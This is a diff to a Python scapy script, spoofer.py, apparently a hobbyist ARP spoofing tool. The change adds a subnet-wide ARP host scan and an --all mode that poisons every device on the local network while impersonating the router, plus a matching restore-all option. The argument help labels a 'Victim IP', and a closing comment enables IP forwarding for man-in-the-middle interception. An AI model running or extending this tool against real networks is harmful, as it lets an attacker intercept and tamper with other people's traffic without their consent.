@@ -1,13 +1,43 @@
 import sys
 import time
 import argparse
-from scapy.all import ARP, Ether, srp1, sendp, get_if_hwaddr
+from scapy.all import ARP, Ether, srp1, sendp, get_if_hwaddr, srp
 
 iface = "wlp2s0"  # change if needed
 
+
+
+
+def scan_active_hosts(subnet_prefix):
+    #subnet netprecx is gonna be MOST LIKELY 192.168.1.
+    #as it was cleverly made pre call
+
+    active_hosts = []
+
+    for i in range(2, 255):  
+        #1 to 254 (skip .0 and .255) as range is exclusive of outer??
+
+        ip = subnet_prefix + str(i)
+
+        arp = ARP(pdst=ip)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp
+        #create the frame and send it
+
+        answered, _ = srp(packet, timeout=1, verbose=False)
+        #talked through this logic before
+
+        for _, rcv in answered:
+            active_hosts.append((rcv.psrc, rcv[Ether].src))
+            #and this logic talked before
+
+    return active_hosts
+
+
+
 def get_mac(ip):
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    resp = srp1(pkt, timeout=2, iface=iface, verbose=False)
+    resp = srp1(pkt, timeout=0.5, iface=iface, verbose=False)
     return resp[Ether].src if resp else None
     #send ARP out asking to all whos IP this is and get their MAC
 
@@ -113,11 +143,15 @@ def start_spoofer(spoofed_ip, target_ip):
 #script run directly not imported
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument("spoofed_ip", nargs="?", help="IP to pretend to be")
-    parser.add_argument("target_ip", nargs="?", help="Victim IP")
-    parser.add_argument("--restore", action="store_true", help="Restore ARP")
-    #adds the args
 
+    parser.add_argument("spoofed_ip", nargs="?", help="IP router")
+    parser.add_argument("target_ip", nargs="?", help="Victim IP (if not spoofing all)")
+    parser.add_argument("--restore", action="store_true", help="Restore single")
+    parser.add_argument("--all", action="store_true", help="Spoof all devices on subnet")
+    parser.add_argument("--restore-all", action="store_true", help="Restore all devices on subnet")
+
+    #adds the args
+    #added more
 
     args = parser.parse_args()
     #gets them
@@ -129,13 +163,46 @@ if __name__ == "__main__":
         spoofed_mac = get_mac(args.spoofed_ip)
         target_mac = get_mac(args.target_ip)
         restore_arp(args.target_ip, target_mac, args.spoofed_ip, spoofed_mac)
+
+
+    elif args.restore_all:
+        if not args.spoofed_ip:
+            print("Usage: python3 spoofer.py --restore-all <spoofed_ip>")
+            #usage message on how to correctly do it
+            sys.exit(1)
+        spoofed_mac = get_mac(args.spoofed_ip)
+        #get router MAC
+        subnet_prefix = '.'.join(args.spoofed_ip.split('.')[:3]) + '.'
+        #so uses . as the seperator therefore splits 1.1.1.1 into 192, 168, 1, 1
+        #then grabs the first 3 so 192, 168, 1
+        #then joins them with . again so now its 192.168.1
+        #THEN puts a dot at the end so now its 192.168.1. like we want 
+
+        active_hosts = scan_active_hosts(subnet_prefix)
+
+        print(f"[+] Restoring {len(active_hosts)} devices...")
+        for ip, mac in active_hosts:
+            if ip == args.spoofed_ip:
+                #so it doesnt send it to the router although ive already taken precaution with 2-254 not 1
+                continue
+            restore_arp(ip, mac, args.spoofed_ip, spoofed_mac)
+            #then calls restore for EACH ip,mac combo
+
+
+    elif args.all:
+        if not args.spoofed_ip:
+            print("Usage: python3 spoofer.py <spoofed_ip> --all")
+            sys.exit(1)
+        spoof_all(args.spoofed_ip)
         #self explanatory
+
     else:
         if not args.spoofed_ip or not args.target_ip:
             print("Usage: python3 spoofer.py <spoofed_ip> <target_ip>")
             sys.exit(1)
         start_spoofer(args.spoofed_ip, args.target_ip)
-        #same here
+        #this is a single spoof
+
 
 
 #sudo sysctl -w net.ipv4.ip_forward=1
